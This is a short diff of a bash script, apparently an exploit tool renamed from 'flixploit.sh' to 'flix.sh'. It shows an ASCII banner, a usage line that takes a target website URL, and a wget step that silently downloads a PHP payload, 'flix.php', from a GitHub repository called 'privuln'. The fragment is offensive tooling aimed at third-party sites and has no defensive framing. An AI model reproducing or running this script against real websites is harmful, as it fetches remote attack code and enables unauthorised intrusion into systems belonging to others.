@@ -9,7 +9,7 @@ ${PURPLE}   |_|   |_| \ |_|${RED}  \_\/ ${GREEN} \_\_/ |_|__ |_| \|  ${RESAT}133
 EOF
 
 if [[ $1 == "" ]]; then
-    echo -e " Usage: bash flixploit.sh https://target.com/index_path"
+    echo -e " Usage: bash flix.sh https://target.com/index_path"
     exit 1
 elif [[ ! -f flix.php ]]; then
     wget https://raw.githubusercontent.com/1337r0j4n/privuln/main/flix.php > /dev/null 2>&1
